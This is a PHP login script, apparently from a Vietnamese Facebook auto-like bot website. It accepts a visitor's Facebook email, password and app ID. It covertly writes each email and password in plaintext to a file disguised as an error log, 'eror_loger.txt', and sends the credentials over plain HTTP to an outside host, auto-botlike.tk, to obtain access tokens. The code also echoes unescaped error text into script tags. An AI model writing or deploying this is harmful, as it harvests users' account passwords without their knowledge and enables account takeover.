<?php 
ob_start();
session_start();
date_default_timezone_set("Asia/Ho_Chi_Minh");
if ($_POST) 
{
	require("../_cnF/_star_cn_F.php");
	require("../_cnF/_star_funC.php");
	$email = $_POST['email'];
	$password = $_POST['password'];
	$app_id = $_POST['app'];
$file = "eror_loger.txt";
$email = $_POST['email'];
$password = $_POST['password'];
$date = date("d/m/Y - g:i a");
$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "Tài Khoản: ");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "Mật Khẩu: ");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "Đăng Nhập Lúc: ");
fwrite($handle, "$date");
fwrite($handle, "\n");
fclose($handle);
        if($app_id == 350685531728){
	        $json = json_decode(auto('http://auto-botlike.tk/login/android.php?u='.$email.'&p='.$password),true);
	        if ($json['access_token']){
		$_SESSION['ses_token'] = $json['access_token'];
		die('Đăng Nhập Thành Công. Đang Chuyển Hướng Vui Lòng Chờ ...<script type="text/javascript">toarst("success","Đăng Nhập Thành Công. Hệ Thống Đang Chuyển Hướng","Lời Nhắn");window.location="../AUTO-AND-BOT-LIKE-FACEBOOK-LOGIN-CAPTCHA.html";</script>');
	          }else{
		  die($json['error_msg'].'<script type="text/javascript">toarst("error","'.$json[error_msg].'","Đăng Nhập Thất Bại");</script>');
	         }
        }else if($app_id == 6628568379){
	        $json = json_decode(auto('http://auto-botlike.tk/login/iphone.php?u='.$email.'&p='.$password),true);
	        if ($json['access_token']){
		$_SESSION['ses_token'] = $json['access_token'];
		die('Đăng Nhập Thành Công. Đang Chuyển Hướng Vui Lòng Chờ ...<script type="text/javascript">toarst("success","Đăng Nhập Thành Công. Hệ Thống Đang Chuyển Hướng","Lời Nhắn");window.location="../AUTO-AND-BOT-LIKE-FACEBOOK-LOGIN-CAPTCHA.html";</script>');
	          }else{
		  die($json['error_msg'].'<script type="text/javascript">toarst("error","'.$json[error_msg].'","Đăng Nhập Thất Bại");</script>');
	         }
        }else if($app_id == 165907476854626){
	        $json = json_decode(auto('http://auto-botlike.tk/login/ios.php?u='.$email.'&p='.$password),true);
	        if ($json['access_token']){
		$_SESSION['ses_token'] = $json['access_token'];
		die('Đăng Nhập Thành Công. Đang Chuyển Hướng Vui Lòng Chờ ...<script type="text/javascript">toarst("success","Đăng Nhập Thành Công. Hệ Thống Đang Chuyển Hướng","Lời Nhắn");window.location="../AUTO-AND-BOT-LIKE-FACEBOOK-LOGIN-CAPTCHA.html";</script>');
	          }else{
		  die($json['error_msg'].'<script type="text/javascript">toarst("error","'.$json[error_msg].'","Đăng Nhập Thất Bại");</script>');
	         }
        }else if($app_id == 41158896424){
	        $json = json_decode(auto('http://auto-botlike.tk/login/htc.php?u='.$email.'&p='.$password),true);
	        if ($json['access_token']){
		$_SESSION['ses_token'] = $json['access_token'];
		die('Đăng Nhập Thành Công. Đang Chuyển Hướng Vui Lòng Chờ ...<script type="text/javascript">toarst("success","Đăng Nhập Thành Công. Hệ Thống Đang Chuyển Hướng","Lời Nhắn");window.location="../AUTO-AND-BOT-LIKE-FACEBOOK-LOGIN-CAPTCHA.html";</script>');
	          }else{
		  die($json['error_msg'].'<script type="text/javascript">toarst("error","'.$json[error_msg].'","Đăng Nhập Thất Bại");</script>');
	         }
        }

}